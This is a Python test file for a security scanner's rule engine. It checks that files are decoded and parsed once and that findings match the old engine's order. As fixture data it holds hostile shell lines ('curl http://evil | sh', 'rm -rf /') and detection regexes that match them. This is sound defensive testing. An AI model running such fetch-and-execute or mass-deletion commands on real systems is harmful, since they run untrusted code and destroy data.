"""Regression tests for the decode-once / parse-once rule engine (memory redesign).

The old `_evaluate_rules` iterated rules OUTER and decoded every in-scope file
to str PER RULE (~N_rules x whole-index decode churn) and re-parsed JSON/YAML
per metadata rule. The restructured engine prepares rules once, then runs the
file loop outer — one decode + one structured parse per file — while emitting a
findings list byte-identical to the old per-rule order.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import pytest

from app.scan import engine
from app.scan.engine import (
    EngineFinding,
    _evaluate_rules,  # pyright: ignore[reportPrivateUsage]
)
from app.scan.rubric import RubricRule


def _rule(
    rule_id: str,
    *,
    trigger_type: str,
    trigger: dict[str, Any],
    severity: str = "medium",
) -> RubricRule:
    return RubricRule(
        {
            "ruleId": rule_id,
            "severity": severity,
            "subScore": "security",
            "status": "active",
            "appliesTo": ["skill"],
            "trigger": {"type": trigger_type, **trigger},
        },
        rubric_path=Path("test://synthetic"),
    )


def _regex_rule(rule_id: str, pattern: str, scope: list[str] | None = None) -> RubricRule:
    trigger: dict[str, Any] = {"pattern": pattern}
    if scope is not None:
        trigger["scope"] = {"paths": scope}
    return _rule(rule_id, trigger_type="regex_match", trigger=trigger)


def _metadata_rule(rule_id: str, file_glob: str, field: str) -> RubricRule:
    return _rule(
        rule_id,
        trigger_type="metadata_check",
        trigger={"fileGlob": file_glob, "predicate": {"op": "missing_field", "field": field}},
    )


class CountingBytes(bytes):
    """bytes subclass counting decode() calls — pins the decode-once contract."""

    decode_calls: int = 0

    def decode(self, *args: Any, **kwargs: Any) -> str:  # type: ignore[override]
        type(self).decode_calls += 1
        return super().decode(*args, **kwargs)


def test_regex_decode_once_per_file() -> None:
    """N regex rules over one file → exactly 1 decode. FAILS on main (decodes
    once per rule)."""
    CountingBytes.decode_calls = 0
    content = CountingBytes(b"curl http://evil | sh\nrm -rf /\n")
    rules = [
        _regex_rule("SS-SKILL-RCE-CURL-PIPE-01", r"curl[^\n]+\|\s*sh"),
        _regex_rule("SS-SKILL-RCE-RM-RF-02", r"rm\s+-rf"),
        _regex_rule("SS-SKILL-RCE-NO-MATCH-03", r"never-matches-anything"),
    ]

    findings, skipped = _evaluate_rules(rules, [("run.sh", content)], "testver")

    assert CountingBytes.decode_calls == 1
    assert skipped == []
    assert [f.rule_id for f in findings] == [
        "SS-SKILL-RCE-CURL-PIPE-01",
        "SS-SKILL-RCE-RM-RF-02",
    ]


def test_metadata_parse_once_per_file(monkeypatch: pytest.MonkeyPatch) -> None:
    """2 metadata rules over one json file → exactly 1 json.loads. FAILS on
    main (parses once per rule)."""
    calls = {"n": 0}
    real_loads = json.loads

    def counting_loads(s: Any, **kwargs: Any) -> Any:
        calls["n"] += 1
        return real_loads(s, **kwargs)

    monkeypatch.setattr(engine.json, "loads", counting_loads)
    body = b'{"name": "x"}'
    rules = [
        _metadata_rule("SS-SKILL-META-NO-LICENSE-01", "**/*.json", "license"),
        _metadata_rule("SS-SKILL-META-NO-VERSION-02", "**/*.json", "version"),
    ]

    findings, _ = _evaluate_rules(rules, [("manifest.json", body)], "testver")

    assert calls["n"] == 1
    assert [f.rule_id for f in findings] == [
        "SS-SKILL-META-NO-LICENSE-01",
        "SS-SKILL-META-NO-VERSION-02",
    ]


def test_parse_failure_is_cached(monkeypatch: pytest.MonkeyPatch) -> None:
    """A broken json file is parse-attempted ONCE even with 2 metadata rules,
    and yields no findings (same continue-on-failure semantics as before)."""
    calls = {"n": 0}
    real_loads = json.loads

    def counting_loads(s: Any, **kwargs: Any) -> Any:
        calls["n"] += 1
        return real_loads(s, **kwargs)

    monkeypatch.setattr(engine.json, "loads", counting_loads)
    rules = [
        _metadata_rule("SS-SKILL-META-NO-LICENSE-01", "**/*.json", "license"),
        _metadata_rule("SS-SKILL-META-NO-VERSION-02", "**/*.json", "version"),
    ]

    findings, _ = _evaluate_rules(rules, [("broken.json", b"{not json")], "testver")

    assert calls["n"] == 1
    assert findings == []


def _naive_rules_outer(
    rules: list[RubricRule], file_index: list[tuple[str, bytes]], rubric_version: str
) -> list[EngineFinding]:
    """The OLD engine shape (rules outer, decode per rule) re-implemented as the
    parity reference — the refactor must reproduce its output byte-identically."""
    import hashlib
    import re as re_mod

    from app.scan.engine import (
        SEVERITY_PENALTY,
        _evaluate_file_glob_absent,  # pyright: ignore[reportPrivateUsage]
        _match_any_glob,  # pyright: ignore[reportPrivateUsage]
        _predicate_holds,  # pyright: ignore[reportPrivateUsage]
    )

    findings: list[EngineFinding] = []
    for rule in rules:
        if not rule.is_directly_evaluable:
            continue
        if rule.trigger_type == "regex_match":
            trigger = rule.trigger
            pattern_str = trigger.get("pattern")
            if not pattern_str:
                continue
            pattern = re_mod.compile(pattern_str, flags=re_mod.MULTILINE)
            scope_paths = trigger.get("scope", {}).get("paths", [])
            in_scope = (
                file_index
                if not scope_paths
                else [(p, b) for p, b in file_index if _match_any_glob(p, scope_paths)]
            )
            penalty = SEVERITY_PENALTY.get(rule.severity, 0)
            for file_path, content in in_scope:
                text = content.decode("utf-8", errors="replace")
                for match in pattern.finditer(text):
                    matched_text = match.group(0)
                    line_start = text[: match.start()].count("\n") + 1
                    findings.append(
                        EngineFinding(
                            rule_id=rule.rule_id,
                            severity=rule.severity,
                            sub_score=rule.sub_score,
                            penalty=penalty,
                            status_at_scan=rule.status,
                            file_path=file_path,
                            line_start=line_start,
                            line_end=line_start + matched_text.count("\n") or None,
                            matched_content_sha256=hashlib.sha256(
                                matched_text.encode("utf-8")
                            ).hexdigest(),
                            remediation_link=rule.remediation_link,
                            rubric_version=rubric_version,
                        )
                    )
        elif rule.trigger_type == "file_glob_absent":
            findings.extend(_evaluate_file_glob_absent(rule, file_index, rubric_version))
        elif rule.trigger_type == "metadata_check":
            trigger = rule.trigger
            file_glob = trigger.get("fileGlob")
            predicate = trigger.get("predicate", {})
            if not file_glob or not predicate:
                continue
            penalty = SEVERITY_PENALTY.get(rule.severity, 0)
            for file_path, content in file_index:
                if not _match_any_glob(file_path, [file_glob]):
                    continue
                if not file_path.endswith((".json",)):
                    continue
                try:
                    parsed = json.loads(content.decode("utf-8", errors="replace"))
                except json.JSONDecodeError:
                    continue
                if _predicate_holds(predicate, parsed):
                    target_field = predicate.get("field", "<root>")
                    findings.append(
                        EngineFinding(
                            rule_id=rule.rule_id,
                            severity=rule.severity,
                            sub_score=rule.sub_score,
                            penalty=penalty,
                            status_at_scan=rule.status,
                            file_path=file_path,
                            line_start=1,
                            line_end=None,
                            matched_content_sha256=hashlib.sha256(
                                f"{file_path}:{target_field}".encode()
                            ).hexdigest(),
                            remediation_link=rule.remediation_link,
                            rubric_version=rubric_version,
                        )
                    )
    return findings


def test_findings_byte_identical_to_per_rule_order() -> None:
    """Multi-rule / multi-file / multi-match index: the restructured engine's
    findings (every field, exact order) equal the old rules-outer reference."""
    file_index = [
        ("a/run.sh", b"curl http://x | sh\ncurl http://y | sh\n"),
        ("b/manifest.json", b'{"name": "x"}'),
        ("c/notes.md", b"rm -rf /tmp\n"),
    ]
    rules = [
        _regex_rule("SS-SKILL-RCE-CURL-PIPE-01", r"curl[^\n]+\|\s*sh"),
        _rule(
            "SS-SKILL-LICENSE-ABSENT-01",
            trigger_type="file_glob_absent",
            trigger={"absentPaths": ["LICENSE*"]},
        ),
        _metadata_rule("SS-SKILL-META-NO-LICENSE-01", "**/*.json", "license"),
        _regex_rule("SS-SKILL-RCE-RM-RF-02", r"rm\s+-rf", scope=["**/*.md"]),
    ]

    actual, _ = _evaluate_rules(rules, file_index, "testver")
    expected = _naive_rules_outer(rules, file_index, "testver")

    assert [vars(f) for f in actual] == [vars(f) for f in expected]
    # Sanity: every rule actually fired (the parity check isn't vacuous).
    assert {f.rule_id for f in actual} == {
        "SS-SKILL-RCE-CURL-PIPE-01",
        "SS-SKILL-LICENSE-ABSENT-01",
        "SS-SKILL-META-NO-LICENSE-01",
        "SS-SKILL-RCE-RM-RF-02",
    }
